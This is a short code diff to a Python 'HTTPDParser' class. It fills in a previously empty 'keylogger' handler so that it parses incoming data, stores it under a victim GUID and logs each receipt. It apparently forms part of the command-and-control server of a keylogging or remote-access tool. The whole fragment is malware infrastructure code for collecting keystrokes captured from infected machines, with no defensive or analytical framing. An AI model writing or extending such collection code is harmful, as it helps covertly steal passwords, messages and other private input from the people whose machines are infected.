@@ -47,4 +47,6 @@ class HTTPDParser:
 	self.output = "pong"
 
     def keylogger(self, guid, data):
-	pass
+	cmd, guid, data = data.split(" ", 2)
+	Log.append_keylogger_data(guid, data)
+	Log.log_event("Keylogger", "Data received (%s)" % (guid))
